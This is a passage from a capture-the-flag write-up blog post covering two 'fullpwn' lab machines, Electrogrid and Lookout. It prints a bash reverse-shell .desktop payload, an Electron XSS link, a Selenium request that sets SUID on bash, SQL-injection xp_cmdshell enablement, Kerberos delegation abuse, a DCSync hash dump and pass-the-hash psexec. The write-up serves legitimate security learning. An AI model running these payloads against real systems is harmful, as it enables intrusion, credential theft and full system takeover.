+<p>Another thing to change is the CSP in the <code>index.html</code>. We can either change <code>127.0.0.1</code> to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP:</p>
+<p><img src="/assets/img/stack-the-flags-2022/html-csp.webp" alt="A screenshot that shows the Content Security Policy of the Web page"></p>
+<p>Then we can run the app:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:~/htb/medimelecro/resources » electron extract</span></span></code></pre>
+<p><img src="/assets/img/stack-the-flags-2022/app-gui.webp" alt="A screenshot of the Electron App GUI"></p>
+<p>We can also see also the previous conversation that we extracted from the web API:</p>
+<p><img src="/assets/img/stack-the-flags-2022/admin-chat-gui.webp" alt="A screenshot of the Admin chat with the developer"></p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>To wrap everything we found until now:</p>
+<ul>
+<li>Usage of shell.openExternal(url) which can lead to XSS -> RCE</li>
+<li>We can send messages to the admin user</li>
+<li>We can upload messages to the admin user</li>
+<li>Messages mentioning the usage of Selenium scripts</li>
+</ul>
+<p>The only exploitation path we can see is we assume that there is a bot that’s either downloading the files or clicking the urls (or maybe both?).</p>
+<p>To achieve RCE, we will trick the bot into opening our malicious <code>.desktop</code> file which will contain our reverse shell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line"><span style="color:#B392F0">[Desktop Entry]</span></span>
+<span class="line"><span style="color:#F97583">Exec</span><span style="color:#E1E4E8">=bash -c </span><span style="color:#9ECBFF">"bash -i >&#x26; /dev/tcp/10.10.14.57/443 0>&#x26;1"</span></span>
+<span class="line"><span style="color:#F97583">Type</span><span style="color:#E1E4E8">=Application</span></span></code></pre>
+<p>We will trick the user to open our link, which will be passed to <code>shell.openExternal</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> className</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"an"</span><span style="color:#B392F0"> open</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"LINK"</span><span style="color:#E1E4E8">>test&#x3C;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>At this point, we don’t know whether the bot will download the script or not. We can try both approachs.</p>
+<ol>
+<li>The easy way is just to host the file in a localwebserver.</li>
+</ol>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> className</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"an"</span><span style="color:#B392F0"> open</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"http://ip:port/pwn.desktop"</span><span style="color:#E1E4E8">>test&#x3C;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">></span></span></code></pre>
+<ol start="2">
+<li>The other way is to hope that downloads the file.
+<blockquote>
+<p>Spoilers: the bot also downloads the file u.u</p>
+</blockquote>
+</li>
+</ol>
+<p>We know from the source that it gets downloaded in <code>/opt/userland</code> and we retrieve the random file name with two ways as well.</p>
+<ol>
+<li>Downloading the file locally using the gui, we need to create a writeable /opt/userland in our local system)</li>
+<li>Using the Web API to upload the file and the filename will be in the response</li>
+</ol>
+<p>In this case our payload will be:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> className</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"an"</span><span style="color:#B392F0"> open</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"file:///opt/userland/5b208f3cb06c3d4a44afa8c948f9aa35.desktop"</span><span style="color:#E1E4E8">>test&#x3C;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>Once we make sure the payload is hosted/downloaded we can send the HTML payload and wait until we get a shell.</p>
+<p><img src="/assets/img/stack-the-flags-2022/payload-xss-rendered.webp" alt="A screenshot that shows that our XSS payload is rendered"></p>
+<p>And we get a shell back!</p>
+<p><img src="/assets/img/stack-the-flags-2022/user-flag-john.webp" alt="A screenshot where we got a shell back as john"></p>
+<h3 id="privilege-escalation-1">Privilege Escalation</h3>
+<p>The first thing I’ve checked is the running processes as <code>root</code>. In this case, I’ve found a Selenium server running as root locally.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">root</span><span style="color:#79B8FF">         623</span><span style="color:#79B8FF">       1</span><span style="color:#79B8FF">  0</span><span style="color:#9ECBFF"> 14:12</span><span style="color:#9ECBFF"> ?</span><span style="color:#9ECBFF">        00:00:00</span><span style="color:#9ECBFF"> /usr/sbin/cron</span><span style="color:#79B8FF"> -f</span><span style="color:#79B8FF"> -P</span></span>
+<span class="line"><span style="color:#B392F0">root</span><span style="color:#79B8FF">         638</span><span style="color:#79B8FF">     623</span><span style="color:#79B8FF">  0</span><span style="color:#9ECBFF"> 14:12</span><span style="color:#9ECBFF"> ?</span><span style="color:#9ECBFF">        00:00:00</span><span style="color:#79B8FF">  \_</span><span style="color:#9ECBFF"> /usr/sbin/CRON</span><span style="color:#79B8FF"> -f</span><span style="color:#79B8FF"> -P</span></span>
+<span class="line"><span style="color:#B392F0">root</span><span style="color:#79B8FF">         641</span><span style="color:#79B8FF">     638</span><span style="color:#79B8FF">  0</span><span style="color:#9ECBFF"> 14:12</span><span style="color:#9ECBFF"> ?</span><span style="color:#9ECBFF">        00:00:00</span><span style="color:#79B8FF">      \_</span><span style="color:#9ECBFF"> /bin/sh</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> java</span><span style="color:#79B8FF"> -jar</span><span style="color:#9ECBFF"> /root/selenium-server-4.4.0.jar</span><span style="color:#9ECBFF"> standalone</span><span style="color:#79B8FF"> --host</span><span style="color:#79B8FF"> 127.0.0.1</span></span>
+<span class="line"><span style="color:#B392F0">root</span><span style="color:#79B8FF">         643</span><span style="color:#79B8FF">     641</span><span style="color:#79B8FF">  0</span><span style="color:#9ECBFF"> 14:12</span><span style="color:#9ECBFF"> ?</span><span style="color:#9ECBFF">        00:00:31</span><span style="color:#79B8FF">          \_</span><span style="color:#9ECBFF"> java</span><span style="color:#79B8FF"> -jar</span><span style="color:#9ECBFF"> /root/selenium-server-4.4.0.jar</span><span style="color:#9ECBFF"> standalone</span><span style="color:#79B8FF"> --host</span><span style="color:#79B8FF"> 127.0.0.1</span></span></code></pre>
+<p>The idea behind exploiting Selenium is to create a session that executes code. In simpler words, we can achieve RCE through geckodriver.</p>
+<p>First I’ll forward the port <code>4444</code> running locally on the machine to my local machine using <code>chisel</code>. I’ll run a chisel server on my machine:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:~/htb-trustable » chisel server -p 8888 --reverse</span></span>
+<span class="line"><span>2022/12/05 06:10:10 server: Reverse tunnelling enabled</span></span>
+<span class="line"><span>2022/12/05 06:10:10 server: Fingerprint H7MAdhulXPbLGvJaJWk7UmAzd8e/4NPB4rlR4eDaklQ=</span></span>
+<span class="line"><span>2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888</span></span></code></pre>
+<p>Download chisel to the remote machine and I’ll forward the port:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel</span></span>
+<span class="line"><span>john@electrogrid:/dev/shm$ chmod +x ./chisel</span></span>
+<span class="line"><span>john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &#x26;</span></span>
+<span class="line"><span>./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &#x26;</span></span></code></pre>
+<p>And we’ll get a connection.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=>4444: Listening</span></span></code></pre>
+<p>Now we can access the Selenium Grid from our machine.</p>
+<p><img src="/assets/img/stack-the-flags-2022/selenium-grid-web.webp" alt="A screenshot of Selenium web grid interface"></p>
+<p>And now I’ll create the malicious session where it will set the <code>suid</code> bit to the <code>/bin/bash</code> binary.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> /wd/hub/session </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> localhost:4444</span></span>
+<span class="line"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> python-requests/2.27.1</span></span>
+<span class="line"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> */*</span></span>
+<span class="line"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/json;charset=utf-8</span></span>
+<span class="line"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 276</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#79B8FF">    "capabilities"</span><span style="color:#E1E4E8">: {</span></span>
+<span class="line"><span style="color:#79B8FF">        "alwaysMatch"</span><span style="color:#E1E4E8">: {</span></span>
+<span class="line"><span style="color:#79B8FF">            "browserName"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"chrome"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            "goog:chromeOptions"</span><span style="color:#E1E4E8">: {</span></span>
+<span class="line"><span style="color:#79B8FF">                "binary"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"/usr/bin/python3"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">                "args"</span><span style="color:#E1E4E8">: [</span><span style="color:#9ECBFF">"-cimport os;os.system('chmod u+s /bin/bash')"</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>After making the request, we can see in the UI that our request is in queue.</p>
+<p><img src="/assets/img/stack-the-flags-2022/selenium-web-queue.webp" alt="A screenshot of the Selenium Web queue that shows our payload"></p>
+<p>Once it disappears from the queue, it means it’s finished.</p>
+<p>We can go back to the remote machine and check.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>john@electrogrid:/dev/shm$ ls -la /bin/bash           ls -la /bin/bash</span></span>
+<span class="line"><span>ls -la /bin/bash</span></span>
+<span class="line"><span>-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span></span></code></pre>
+<p>And it worked!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>john@electrogrid:/dev/shm$ /bin/bash -p               /bin/bash -p</span></span>
+<span class="line"><span>/bin/bash -p</span></span>
+<span class="line"><span>id</span></span>
+<span class="line"><span>uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)</span></span>
+<span class="line"><span>cat /root/root.txt</span></span>
+<span class="line"><span>STF22{bbe7145febbce7ddd4dd3e22a37e93d1}</span></span></code></pre>
+<p>And thats it for this one!</p>
+<h2 id="lookout-fullpwn-2000-points">Lookout (Fullpwn, 2000 Points)</h2>
+<p>Note: This will be a short writeup as I used two unintended ways to get system on the machine.</p>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>I’ll start with an <code>nmap</code> scan with the usual options:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Discovered open port 80/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 135/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 445/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 139/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 53/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 3269/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 389/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 88/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 636/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 3268/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 593/tcp on 10.129.254.249</span></span>
+<span class="line"><span>Discovered open port 464/tcp on 10.129.254.249</span></span></code></pre>
+<p>For the sake of the writeup, I’ll jump straight to the webserver on port 80, where we have a way to execute some commands such as <code>ping</code>, <code>traceroute</code>, and <code>nslookup</code>.</p>
+<p><img src="/assets/img/stack-the-flags-2022/Lookout-Utility-WebPage.webp" alt="A screenshot of the Lookout Utility WebPage"></p>
+<p>This page is not vulnerable to anything, so I’ll just ping my box for now:</p>
+<p><img src="/assets/img/stack-the-flags-2022/Scan-Results.webp" alt="A screenshot of the Scan Results that we runned through the utility"></p>
+<p>We can check in the <code>Past Scans</code> that our scan was created!</p>
+<p><img src="/assets/img/stack-the-flags-2022/Past-Results.webp" alt="A screenshot that shows all the Past Results"></p>
+<p>We can notice that we delete the scan with the X under action. I’ll intercept that request using burp to play a bit with it:</p>
+<p><img src="/assets/img/stack-the-flags-2022/request-delete-scan.webp" alt="A screenshot that shows the request delete scan"></p>
+<p>After a few tries, I noticed it was vulnerable to an SQLi:</p>
+<p><img src="/assets/img/stack-the-flags-2022/testing-sqli-sleep.webp" alt="A screenshot where we test testing SQLi sleep and that shows the 5 seconds delay"></p>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>The first thing I’ve tried was to enable <code>xp_cmdshell</code> and use it get code execution:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>EXEC sp_configure 'show advanced options', 1</span></span>
+<span class="line"><span>RECONFIGURE-- -</span></span>
+<span class="line"><span>EXEC sp_configure 'xp_cmdshell', '1'</span></span>
+<span class="line"><span>RECONFIGURE</span></span></code></pre>
+<p><img src="/assets/img/stack-the-flags-2022/configure1.webp" alt="A screenshot of xp_cmdshell configuration"></p>
+<p><img src="/assets/img/stack-the-flags-2022/configure2.webp" alt="A screenshot of xp_cmdshell configuration"></p>
+<p><img src="/assets/img/stack-the-flags-2022/configure3.webp" alt="A screenshot of xp_cmdshell configuration"></p>
+<p>Then we can use <code>EXEC xp_cmdshell '&#x3C;COMMAND>'</code>.</p>
+<p><img src="/assets/img/stack-the-flags-2022/rce-sqli.webp" alt="A screenshot of executing xp_cmdshell to get a reverse shell through powershell"></p>
+<p>And we get a shell as the nt service:</p>
+<p><img src="/assets/img/stack-the-flags-2022/shell-as-service-nt.webp" alt="A screenshot of getting a shell as nt service"></p>
+<blockquote>
+<p>Nothing that we can directly get a shell with sqlmap</p>
+</blockquote>
+<p><img src="/assets/img/stack-the-flags-2022/sqlmap-result.webp" alt="A screenshot that shows the sqlmap results"></p>
+<h3 id="privilege-escalation-2">Privilege Escalation</h3>
+<p>Since we have a shell as service account. we can get system directly with two ways.</p>
+<h4 id="first-way">First Way</h4>
+<p>The Service accounts are vulnerable to TGT delegation attacks using Rubeus because the service account is often configured with high privileges on the local system, such as the ability to create and modify user accounts and other system resources.</p>
+<p>The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrator.</p>
+<p>First I’ll upload Rubeus to the remove machine.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/Rubeus.exe -o r.exe</span></span></code></pre>
+<p>Then I’ll use it to generate a TGT for the service account.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PS C:\Windows\System32\spool\drivers\color> .\r.exe tgtdeleg /nowrap</span></span>
+<span class="line"><span>.\r.exe tgtdeleg /nowrap</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   ______        _</span></span>
+<span class="line"><span>  (_____ \      | |</span></span>
+<span class="line"><span>   _____) )_   _| |__  _____ _   _  ___</span></span>
+<span class="line"><span>  |  __  /| | | |  _ \| ___ | | | |/___)</span></span>
+<span class="line"><span>  | |  \ \| |_| | |_) ) ____| |_| |___ |</span></span>
+<span class="line"><span>  |_|   |_|____/|____/|_____)____/(___/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  v2.2.0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Action: Request Fake Delegation TGT (current user)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'</span></span>
+<span class="line"><span>[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/LOOKOUT-DC.LOOKOUT.local'</span></span>
+<span class="line"><span>[+] Kerberos GSS-API initialization success!</span></span>
+<span class="line"><span>[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.</span></span>
+<span class="line"><span>[*] Found the AP-REQ delegation ticket in the GSS-API output.</span></span>
+<span class="line"><span>[*] Authenticator etype: aes256_cts_hmac_sha1</span></span>
+<span class="line"><span>[*] Extracted the service ticket session key from the ticket cache: CYLfo1W5+vf4ZTDXhdsbhxx6n45eG6ONzEKGryITLUg=</span></span>
+<span class="line"><span>[+] Successfully decrypted the authenticator</span></span>
+<span class="line"><span>[*] base64(ticket.kirbi):</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>      doIF3jCCBdqgA&#x3C;SNIIIIIIIIIP>AWoAMCAQGFM</span></span></code></pre>
+<p>I’ll save to my local machine and convert the ticket with <code>TicketConverter</code> from <code>impacket</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:/tmp/wr » cat ticket| base64 -d > ticket.kirbi</span></span>
+<span class="line"><span>hcue@pjsk:/tmp/wr » impacket-ticketConverter ticket.kirbi ticket.ccache</span></span>
+<span class="line"><span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] converting kirbi to ccache...</span></span>
+<span class="line"><span>[+] done</span></span></code></pre>
+<p>Then I’ll export it to my env variables.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:/tmp/wr » export KRB5CCNAME=/tmp/wr/ticket.ccache</span></span></code></pre>
+<p>One last thing, we need to synchronize our local time to the server, otherwise it won’t work.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sudo ntpdate 10.129.254.249</span></span></code></pre>
+<p>Now to perform a DCSync on the target, we can use impacket’s <code>secretsdump.py</code> script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:/tmp/wr » impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass -k</span></span>
+<span class="line"><span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user</span></span>
+<span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span>
+<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb313353c5eaceb1aae589b1644737bb:::</span></span>
+<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab92b60e75818bbb70ca754897aa1e37:::</span></span>
+<span class="line"><span>LOOKOUT.local\lhuman:1104:aad3b435b51404eeaad3b435b51404ee:de9ca94a6f5ea9113d3370476e42a9cb:::</span></span>
+<span class="line"><span>LOOKOUT.local\fhuman:1105:aad3b435b51404eeaad3b435b51404ee:1501f896cae1fd4f0bf6b9593e81dea3:::</span></span>
+<span class="line"><span>LOOKOUT.local\shuman:1106:aad3b435b51404eeaad3b435b51404ee:f4c0320c516b4eeae0533e930beee3c3:::</span></span>
+<span class="line"><span>LOOKOUT-DC$:1001:aad3b435b51404eeaad3b435b51404ee:440f42cdda7c8d86dedc9655e8c003d0:::</span></span>
+<span class="line"><span>&#x3C;SNIP></span></span></code></pre>
+<p>Now with the administrator hash we can <code>psexec</code> into the machine:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:/tmp/wr » impacket-psexec Administrator@10.129.254.249 -hashes :cb313353c5eaceb1aae589b1644737bb     1 ↵</span></span>
+<span class="line"><span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Requesting shares on 10.129.254.249.....</span></span>
+<span class="line"><span>[*] Found writable share ADMIN$</span></span>
+<span class="line"><span>[*] Uploading file HeqMQBmt.exe</span></span>
+<span class="line"><span>[*] Opening SVCManager on 10.129.254.249.....</span></span>
+<span class="line"><span>[*] Creating service bqIM on 10.129.254.249.....</span></span>
+<span class="line"><span>[*] Starting service bqIM.....</span></span>
+<span class="line"><span>[!] Press help for extra shell commands</span></span>
+<span class="line"><span>Microsoft Windows [Version 10.0.17763.3650]</span></span>
+<span class="line"><span>(c) 2018 Microsoft Corporation. All rights reserved.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>C:\Windows\system32> whoami</span></span>
+<span class="line"><span>nt authority\system</span></span></code></pre>
+<p>And then we grab both flags :D!</p>
+<h4 id="second-way">Second Way</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PS C:\Windows\system32> whoami /priv</span></span>
+<span class="line"><span>whoami /priv</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PRIVILEGES INFORMATION</span></span>
+<span class="line"><span>----------------------</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Privilege Name                Description                               State</span></span>
+<span class="line"><span>============================= ========================================= ========</span></span>
+<span class="line"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span></span>
+<span class="line"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span></span>
+<span class="line"><span>SeMachineAccountPrivilege     Add workstations to domain                Disabled</span></span>
+<span class="line"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled</span></span>
+<span class="line"><span>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled</span></span>
+<span class="line"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span></span>
+<span class="line"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled</span></span>
+<span class="line"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></span></code></pre>
+<p>We have <code>SeImpersonatePrivilege</code> Enabled. Since this is a Windows Server 2019, most of the known Potatos will not work. But likely, there is new potato that could exploit <code>SEimpersonatePrivilege</code> using <code>EfsRpc</code>.</p>
+<blockquote>
+<p><a href="https://github.com/bugch3ck/SharpEfsPotato">https://github.com/bugch3ck/SharpEfsPotato</a></p>
+</blockquote>
+<p>We compile it with Visual Studio and upload it to the remote machine:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/xc_10.10.14.57_443.exe -o xc_10.10.14.57_443.exe</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/SharpEfsPotato.exe -o SharpEfsPotato.exe</span></span></code></pre>
+<p>And then execute my reverse shell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PS C:\Windows\System32\spool\drivers\color> .\SharpEfsPotato.exe -p C:\Windows\System32\spool\drivers\color\xc_10.10.14.57_443.exe</span></span>
+<span class="line"><span>SharpEfsPotato by @bugch3ck</span></span>
+<span class="line"><span>  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[+] Triggering name pipe access on evil PIPE \\localhost/pipe/d112edc0-75de-4d57-8696-f7b9847761a6/\d112edc0-75de-4d57-8696-f7b9847761a6\d112edc0-75de-4d57-8696-f7b9847761a6</span></span>
+<span class="line"><span>df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:</span></span>
+<span class="line"><span>[x]RpcBindingSetAuthInfo failed with status 0x6d3</span></span>
+<span class="line"><span>[+] Server connected to our evil RPC pipe</span></span>
+<span class="line"><span>[+] Duplicated impersonation token ready for process creation</span></span>
+<span class="line"><span>[+] Intercepted and authenticated successfully, launching program</span></span>
+<span class="line"><span>[+] Process created, enjoy!</span></span></code></pre>
+<p>And I grabbed my shell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hcue@pjsk:/opt/xc(master○) » ./xc -l -p 443                                                                                                                                                                                            1 ↵</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>		__  _____</span></span>
+<span class="line"><span>		\ \/ / __|</span></span>
+<span class="line"><span>		>  &#x3C; (__</span></span>
+<span class="line"><span>		/_/\_\___| by @xct_de</span></span>
+<span class="line"><span>		           build: XBWQOEYPUG</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>2022/12/05 09:05:16 Listening on :443</span></span>
+<span class="line"><span>2022/12/05 09:05:16 Waiting for connections...</span></span>
+<span class="line"><span>2022/12/05 09:07:06 Connection from 10.129.254.249:63732</span></span>
+<span class="line"><span>2022/12/05 09:07:06 Stream established</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Auto-Plugins:</span></span>
+<span class="line"><span>[xc: C:\Windows\system32]: whoami</span></span>
+<span class="line"><span>nt authority\system</span></span>
+<span class="line"><span>[xc: C:\Windows\system32]: hostname</span></span>
+<span class="line"><span>LOOKOUT-DC</span></span></code></pre>  </div> <nav class="pager" aria-label="Post navigation"> <a href="/posts/Ezchall-crewctf/"><span class="lbl">← prev</span>Crew CTF 2022 – EzChall &amp; EzChall Again</a> <span></span> </nav> </article> </div> <aside class="toc-rail" data-pagefind-ignore aria-label="Table of contents"> <div class="lbl">contents</div> <ul> <li class="d2"><a href="#beautycare-fullpwn-2000-points">BeautyCare (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration">Enumeration</a></li><li class="d3"><a href="#exploitation">Exploitation</a></li><li class="d3"><a href="#privilege-escalation">Privilege Escalation</a></li><li class="d2"><a href="#electrogrid-fullpwn-2000-points">Electrogrid (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration-1">Enumeration</a></li><li class="d3"><a href="#bonus-part---running-gui-app">BONUS PART - Running GUI app</a></li><li class="d3"><a href="#exploitation-1">Exploitation</a></li><li class="d3"><a href="#privilege-escalation-1">Privilege Escalation</a></li><li class="d2"><a href="#lookout-fullpwn-2000-points">Lookout (Fullpwn, 2000 Points)</a></li><li class="d3"><a href="#enumeration-2">Enumeration</a></li><li class="d3"><a href="#exploitation-2">Exploitation</a></li><li class="d3"><a href="#privilege-escalation-2">Privilege 